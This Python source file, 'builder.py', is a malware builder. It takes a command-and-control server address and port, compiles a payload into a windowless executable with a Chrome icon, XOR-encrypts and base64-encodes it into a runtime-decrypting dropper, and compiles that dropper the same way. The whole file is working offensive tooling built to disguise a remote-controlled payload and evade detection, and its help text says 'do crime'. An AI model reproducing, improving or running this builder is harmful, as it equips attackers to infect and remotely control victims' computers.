import base64
import os
import subprocess
import random
import argparse
from itertools import cycle
import string


def init_args():
    parser = argparse.ArgumentParser(
        prog='builder.py',
        description='Pack a dropper with an encrypted payload that decrypts at runtime. File just gets dropper to temp currently',
        epilog='Be gay, do crime :)'
    )
    parser.add_argument('-f', '--payload',
                        help='The payload to pack',
                        required=False)
    parser.add_argument('-x', '--key',
                        help='The XOR key to encrypt the payload with')
    return parser.parse_args()


def generate_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def xor(data, key):
    return bytes([_a ^ _b for _a, _b in zip(data, cycle(key))])


if __name__ == '__main__':
    args = init_args()
    if not os.path.exists('compiled'):
        os.mkdir('compiled')
    if not args.payload:
        server = input('C2 Server Address: ')
        port = input('C2 Server Port: ')
        with open('main.pyw', 'r') as f:
            script = f.read()
        script = script.replace('%SERVER%', server).replace('\'%PORT%\'', port)

        print('[*] Creating Temp File')
        with open('temp.pyw', 'w') as f:
            f.write(script)
        print('[*] Starting Payload Compilation')
        subprocess.Popen(['pyinstaller', '--onefile', '--distpath', 'compiled', '--noconsole', '-i', 'build_resources/chrome.ico', 'temp.pyw']).wait()
        print(f'[*] Compiled!')
        print(f'[*] Cleaning up build files')
        compilePath = 'compiled/temp.exe'
        try:
            os.remove('temp.pyw')
            os.remove('temp.spec')
        except:
            print('[!] Failed to clean build files')
    else:
        compilePath = args.payload

    if not args.key:
        xor_key = generate_string(7)
        print(f'[*] Generated XOR Key {xor_key}')
    else:
        xor_key = args.key
    print('[*] Reading Compiled Payload')
    with open(compilePath, 'rb') as f:
        payload = f.read()

    print('[*] Reading Dropper Script')
    with open('build_resources/dropper.py', 'r') as f:
        dropper = f.read()

    print('[*] Creating Temp Dropper Script')
    print('[*] Writing XOR Key')
    dropper = dropper.replace('REPLACE_XOR_KEY', xor_key)
    print('[*] Writing b64 Encoded XOR Encrypted payload')
    dropper = dropper.replace('REPLACE_B64_PAYLOAD', base64.b64encode(xor(payload, xor_key.encode())).decode())

    print('[*] Writing To Temp Script')
    with open('temp/dropper.pyw', 'w') as f:
        f.write(dropper)

    print('[*] Compiling Dropper')
    subprocess.Popen(['pyinstaller', '--onefile', '--distpath', 'compiled', '--noconsole', '-i', 'build_resources/chrome.ico', 'temp/dropper.pyw']).wait()
    print(f'[*] Compiled!')
    print(f'[*] Cleaning up build files')
    try:
        os.remove('dropper.spec')
        os.remove('temp/dropper.pyw')
    except:
        print('[!] Failed to clean build files')
